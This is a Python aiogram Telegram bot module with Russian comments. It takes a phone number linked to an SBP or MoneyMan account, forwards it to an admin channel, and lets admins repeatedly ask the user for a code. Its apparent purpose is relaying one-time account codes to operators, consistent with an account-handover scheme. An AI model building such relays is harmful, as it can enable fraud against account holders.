import logging
import sqlite3
from aiogram import Router, F, Bot
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext

from config import NOTIFY_CHANNEL_ID
from states import AdminStates, UserStates
from keyboards import admin_sdat_buttons, user_code_prompt, main_menu
from database import update_app, get_app, get_connection, create_application

router = Router()
logger = logging.getLogger(__name__)


# 1. Запрос кода у пользователя (кнопка «Запросить код»)
@router.callback_query(F.data.startswith("sdat_code_"))
async def sdat_request_code(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer("Код запрошен!")
    parts = callback.data.split("_")
    app_id = int(parts[2])
    user_id = int(parts[3])

    app = get_app(app_id)
    if not app or app['status'] == 'cancelled':
        await callback.message.answer("❌ Заявка не найдена или отменена.")
        return

    new_count = app.get('code_requests_count', 0) + 1
    update_app(app_id, code_requests_count=new_count)

    try:
        await bot.send_message(
            user_id,
            f"🔑 Поступил запрос кода (попытка {new_count}). Нажмите «Ввести код»:",
            reply_markup=user_code_prompt()
        )
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение пользователю: {e}")

    from aiogram.fsm.storage.base import StorageKey
    storage_key = StorageKey(bot.id, user_id, user_id)
    await state.storage.set_state(key=storage_key, state=UserStates.sdat_code_prompt)
    await state.storage.set_data(key=storage_key, data={'app_id': app_id})

    channel_alert_text = f"🔑 Код запрошен (заявка #{app_id}) — попытка {new_count}"
    kb = admin_sdat_buttons(app_id, user_id)

    try:
        await bot.send_message(chat_id=NOTIFY_CHANNEL_ID, text=channel_alert_text, reply_markup=kb)
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение в канал: {e}")

    try:
        await callback.message.edit_reply_markup(reply_markup=kb)
    except Exception:
        pass


# 2. Кнопка «Завершить»
@router.callback_query(F.data.startswith("sdat_complete_"))
async def sdat_admin_complete(callback: CallbackQuery, bot: Bot):
    await callback.answer("Заявка завершена!")
    parts = callback.data.split("_")
    app_id = int(parts[2])
    user_id = int(parts[3])

    app = get_app(app_id)
    if not app:
        await callback.message.answer("❌ Заявка не найдена.")
        return

    update_app(app_id, status='completed')
    completed_text = f"✅ <b>Заявка #{app_id} успешно завершена администратором!</b>"

    try:
        await bot.send_message(user_id, completed_text, parse_mode="HTML")
    except Exception:
        pass

    if app.get('channel_message_id'):
        try:
            await bot.edit_message_text(
                chat_id=NOTIFY_CHANNEL_ID,
                message_id=app['channel_message_id'],
                text=completed_text,
                parse_mode="HTML"
            )
        except Exception:
            pass

    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


# 3. Кнопка «Отменить заявку» (для ЛС с ботом)
@router.callback_query(F.data.startswith("sdat_cancel_"))
async def sdat_admin_cancel_click(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    parts = callback.data.split("_")
    app_id = int(parts[2])
    user_id = int(parts[3])

    await state.set_state(AdminStates.waiting_cancel_reason)
    await state.update_data(cancel_app_id=app_id, cancel_user_id=user_id)
    await callback.message.answer("❌ Введите причину отмены заявки:")


# 4. Ввод причины отмены в ЛС бота
@router.message(AdminStates.waiting_cancel_reason, F.chat.type == "private")
async def process_cancel_reason_private(message: Message, state: FSMContext, bot: Bot):
    reason = message.text.strip()
    data = await state.get_data()
    app_id = data.get("cancel_app_id")
    user_id = data.get("cancel_user_id")

    if app_id:
        update_app(app_id, status='cancelled', cancel_reason=reason)
        app = get_app(app_id)

        cancel_text = f"❌ <b>Заявка #{app_id} отменена администратором.</b>\nПричина: {reason}"

        try:
            await bot.send_message(user_id, cancel_text, parse_mode="HTML")
        except Exception:
            pass

        if app and app.get('channel_message_id'):
            try:
                await bot.edit_message_text(
                    chat_id=NOTIFY_CHANNEL_ID,
                    message_id=app['channel_message_id'],
                    text=cancel_text,
                    parse_mode="HTML"
                )
            except Exception:
                pass

    await state.clear()
    await message.answer("✅ Заявка успешно отменена.", reply_markup=main_menu())


# 5. Обработчик выбора услуги СБП / Манимен (создание заявки)
@router.callback_query(F.data.in_(["service_sbp", "service_moneyman"]))
async def service_chosen(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    service_type = "СБП" if callback.data == "service_sbp" else "МАНИМЕН"

    await state.update_data(service_type=service_type)
    await state.set_state(UserStates.waiting_for_phone)

    await callback.message.edit_text(
        f"📱 Вы выбрали: <b>{service_type}</b>\n\nВведите номер телефона, привязанный к счету:",
        parse_mode="HTML"
    )


# 6. Получение номера телефона и отправка заявки в канал администраторов
@router.message(UserStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip()
    data = await state.get_data()
    service_type = data.get("service_type", "СБП")

    user_id = message.from_user.id
    username = message.from_user.username or "отсутствует"

    app_id = create_application(
        user_id=user_id,
        username=username,
        service_type=service_type,
        phone=phone
    )

    text_for_channel = (
        f"📥 <b>Новая заявка на выдачу (ID: {app_id}):</b>\n"
        f"Тип: {service_type}\n"
        f"Телефон: <code>{phone}</code>\n"
        f" Пользователь: @{username} (ID: {user_id})\n"
        f"Статус: ⏳ Ожидание запроса кода"
    )

    kb = admin_sdat_buttons(app_id, user_id)

    try:
        sent_msg = await bot.send_message(
            chat_id=NOTIFY_CHANNEL_ID,
            text=text_for_channel,
            reply_markup=kb,
            parse_mode="HTML"
        )
        update_app(app_id, channel_message_id=sent_msg.message_id)
    except Exception as e:
        logger.error(f"Не удалось отправить заявку в канал: {e}")

    await state.clear()
    await message.answer(
        f"✅ <b>Заявка #{app_id} успешно создана!</b>\nОжидайте ответа администратора.",
        reply_markup=main_menu(),
        parse_mode="HTML"
    )


# 7. Отмена заявки прямо в канале текстовым сообщением
@router.message(F.chat.id == NOTIFY_CHANNEL_ID)
async def cancel_from_channel_direct(message: Message, bot: Bot):
    reason = message.text.strip()

    with get_connection() as conn:
        conn.row_factory = sqlite3.Row
        row = conn.execute(
            "SELECT * FROM applications WHERE status NOT IN ('completed', 'cancelled') ORDER BY id DESC LIMIT 1"
        ).fetchone()

    if not row:
        return

    app = dict(row)
    app_id = app['id']
    user_id = app['user_id']
    channel_msg_id = app.get('channel_message_id')

    update_app(app_id, status='cancelled', cancel_reason=reason)

    cancel_text = f"❌ <b>Заявка #{app_id} отменена администратором.</b>\nПричина: {reason}"

    try:
        await bot.send_message(user_id, cancel_text, parse_mode="HTML")
    except Exception:
        pass

    if channel_msg_id:
        try:
            await bot.edit_message_text(
                chat_id=NOTIFY_CHANNEL_ID,
                message_id=channel_msg_id,
                text=cancel_text,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Не удалось обновить сообщение в канале: {e}")

    try:
        await message.delete()
    except Exception:
        pass